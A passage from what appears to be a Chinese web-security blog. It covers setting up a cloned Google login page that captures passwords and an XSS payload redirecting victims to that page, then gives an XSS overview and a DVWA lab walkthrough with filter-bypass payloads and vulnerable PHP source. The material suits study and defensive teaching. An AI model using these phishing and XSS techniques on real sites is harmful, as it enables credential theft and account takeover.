src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112018.png"></p><p>让我们选择模板，这里选择google模板作为前端页面</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112022.png"></p><p>钓鱼网站启动成功，访问192.168.253.130即可进入钓鱼网站</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112030.png"></p><p>输入用户名密码点击回车后，就可以在kali终端上看到密码</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803112035.png"></p><p><strong>然后服务器会给客户端重定向到正常的google登陆页面，受害者以为自己第一遍输入错误来达到以假乱真</strong></p><p><strong>该钓鱼网站尝尝与xss漏洞一块使用</strong></p><p><strong>比如利用存储型xss执行如下代码来让受害者访问钓鱼网站</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">window</span>.location.href=<span class="string">&quot;http://192.168.253.130/&quot;</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>或者利用反射型xss，让受害者点击精心构造的链接从而执行如上代码</strong></p><blockquote><p><a href="https://www.sqlsec.com/2020/10/xss2.html">https://www.sqlsec.com/2020/10/xss2.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> xss </tag>
            
            <tag> 钓鱼网站 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS总结</title>
      <link href="/2021/08/03/XSS/"/>
      <url>/2021/08/03/XSS/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS总结"><a href="#XSS总结" class="headerlink" title="XSS总结"></a>XSS总结</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。<br>xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是<strong>寻找参数未过滤的输出函数</strong>。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射型只是简单的将用户输入的数据”反射”给浏览器，其应用场景往往是黑客诱使用户点击一个恶意链接，从而获得用户带cookie信息等，XSS 是非持久性、参数型的跨站脚本。反射型XSS 的JS代码在Web 应用的参数中，如搜索框的反射型XSS。</p><p>在搜索框中，提交PoC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/XSS/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>点击搜索，即可触发反射型XSS</p><h3 id="存储型XSS："><a href="#存储型XSS：" class="headerlink" title="存储型XSS："></a>存储型XSS：</h3><p>代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie（虽然还有种DOM型XSS，但是也还是包括在存储型XSS内）。</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803102430.png"></p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。</p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>其实归根结底，XSS的攻击方式就是想办法“教唆”用户的浏览器去执行一些这个网页中原本不存在的前端代码。</p><p>可问题在于尽管一个信息框突然弹出来并不怎么友好，但也不至于会造成什么真实伤害啊。的确如此，但要说明的是，这里拿信息框说事仅仅是为了举个栗子，真正的黑客攻击在XSS中除非恶作剧，不然是不会在恶意植入代码中写上alert（“say something”）的。</p><ol><li><p><strong>窃取网页浏览中的cookie值</strong></p><p>在网页浏览中我们常常涉及到用户登录，登录完毕之后服务端会返回一个cookie值。这个cookie值相当于一个令牌，拿着这张令牌就等同于证明了你是某个用户。</p><p>如果你的cookie值被窃取，那么攻击者很可能能够直接利用你的这张令牌不用密码就登录你的账户。如果想要通过script脚本获得当前页面的cookie值，通常会用到document.cookie。</p><p>试想下如果像空间说说中能够写入xss攻击语句，那岂不是看了你说说的人的号你都可以登录（不过某些厂商的cookie有其他验证措施如：Http-Only保证同一cookie不能被滥用）</p></li><li><p><strong>劫持流量实现恶意跳转</strong></p><p>这个很简单，就是在网页中想办法插入一句像这样的语句：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">window</span>.location.href=<span class="string">&quot;http://www.baidu.com&quot;</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>那么所访问的网站就会被跳转到百度的首页。</p><p>早在2011年新浪就曾爆出过严重的xss漏洞，导致大量用户自动关注某个微博号并自动转发某条微博。具体各位可以自行百度。</p></li><li><p><strong>网站挂马</strong></p><p>制作一个木马服务器。存在特定漏洞的用户一旦通过浏览器访问木马服务器，就会缓冲区溢出，从而攻击者可以直接获取用户的系统Shell。将木马服务器的URL，插入到一个存在XSS漏洞的正常web服务器中，一旦有人访问该服务器的挂马页面，就会中招。</p><blockquote><p>参考：<a href="https://blog.csdn.net/Monsterlz123/article/details/91127385">https://blog.csdn.net/Monsterlz123/article/details/91127385</a></p></blockquote></li><li><p><strong>窃取用户登录帐号或个人信息</strong></p><blockquote><p><a href="https://www.sqlsec.com/2020/10/xss2.html">https://www.sqlsec.com/2020/10/xss2.html</a></p></blockquote></li><li><p><strong>执行弹窗广告</strong></p><p>通过<code>&lt;iframe&gt;</code>标签等来实现弹窗</p></li><li><p><strong>传播蠕虫病毒</strong></p></li><li><p><strong>钓鱼欺骗</strong></p><p>最典型的即是利用目标网站的反射型跨站脚本漏洞将目标网站重定向到钓鱼网站，或者通过注入钓鱼JavaScript脚本以监控目标网站的表单输入，甚至攻击者基于DHTML技术对目标网站发起更高级的钓鱼攻击。</p></li></ol><h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><h3 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h3><p>一般的当我们的输入回显到我们的页面上时，都可能存在xss注入点，我们首先找到这些可能存在注入的地方比如搜索框或者请求参数，然后输入&lt;script “ ‘ OOnn/&gt;通过返回的网页源码看看后端是否对这些敏感字符进行了过滤，然后针对不同的过滤构造不同的payload或者其变形来进行绕过注入</p><ol><li>通常搜索栏容易出现反射型XSS，留言板容易出现存储型XSS；</li><li>通过变化不同的script，尝试绕过后台的过滤机制。</li></ol><h3 id="白盒测试"><a href="#白盒测试" class="headerlink" title="白盒测试"></a>白盒测试</h3><p>关于XSS的代码审计主要就是从接收参数的地方和一些关键词入手。</p><p>PHP中常见的接收参数的方式有<code>$_GET</code>、<code>$_POST</code>、<code>$_REQUEST</code>等等，可以搜索所有接收参数的地方。然后对接收到的数据进行跟踪，看看有没有输出到页面中，然后看输出到页面中的数据是否进行了过滤和html编码等处理。</p><p>也可以搜索类似echo这样的输出语句，跟踪输出的变量是从哪里来的，我们是否能控制，如果从数据库中取的，是否能控制存到数据库中的数据，存到数据库之前有没有进行过滤等等。</p><p>大多数程序会对接收参数封装在公共文件的函数中统一调用，我们就需要审计这些公共函数看有没有过滤，能否绕过等等。</p><h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><h2 id="XSS-Reflected"><a href="#XSS-Reflected" class="headerlink" title="XSS (Reflected)"></a>XSS (Reflected)</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803102514.png"></p><p>弹窗成功</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803102637.png"></p><p>看一下源码发现没有对输入做任何过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><p>故技重施</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803102523.png"></p><p>发现script关键字被过滤</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803102530.png"></p><p><strong>猜测可能后端可能存在</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">preg_replace(<span class="string">&quot;/&lt;script&gt;/i&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$name</span>);</span><br></pre></td></tr></table></figure><p>所以尝试双写绕过或者大小写绕过</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803102539.png"></p><p>成功</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803102637.png"></p><p>双写：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803102650.png"></p><p>成功：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803102713.png"></p><p>查看源码发现确实使用了strplace</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><p>故技重施</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803102723.png"></p><p><strong>发现只给我回来了最后一个&gt;，所以猜测是通过preg_replace的贪婪模式匹配过滤了script字符</strong></p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803102731.png"></p><p>那么尝试比如img标签</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803102757.png"></p><p>成功弹窗</p><p>查看源码发现其用.*的贪婪模式来从后向前匹配s，c，r，i，p，t字符，从而导致刚开始的payload只剩下&gt;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h3><p>分析源码,可以看到使用htmlspecialchars函数对参数进行html实体转义，此时就无法利用XSS漏洞了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = htmlspecialchars( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="XSS-Stored"><a href="#XSS-Stored" class="headerlink" title="XSS(Stored)"></a>XSS(Stored)</h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><p>没有任何对用户输入进行过滤</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803102811.png"></p><p>弹窗成功</p><h3 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h3><p>故技重施</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803102824.png"></p><p>发现被过滤了script标签</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803102836.png"></p><p>大小写绕过</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803102842.png"></p><p>还是不行，可能是后端strplace加了i</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803102850.png"></p><p>尝试双写</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803102855.png"></p><p>也不行</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803105019.png"></p><p>换img标签</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803102908.png"></p><p>然后尝试各种payload以及变形均不行，所以猜测message处没有xss漏洞，那就尝试name：</p><p>&lt;img  src=1  οnerrοr=alert(“hack”)&gt;</p><p>成功弹窗</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210803102916.png"></p><p><strong>查看源码：</strong></p><p>发现对于message传递过来的参数</p><p>服务器首先进行了trim处理，即去掉参数两边的预定义字符</p><p>然后经过strip_tags处理，即去除参数中的标签，这是致命的</p><p>最后htmlspecialchars处理，即将&lt;，&gt;等转换为内容实体，从而防止浏览器将其当作标签</p><p>而对于name参数来说只是过滤了script标签，像这种我们就可以有很多种绕过方式利用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = strip_tags( addslashes( <span class="variable">$message</span> ) );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h3><p>用medium的方法成功，查看源码发现name参数的过滤还是没有message那么严格，只是针对script进行了过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = strip_tags( addslashes( <span class="variable">$message</span> ) );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = stripslashes( <span class="variable">$message</span> );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span 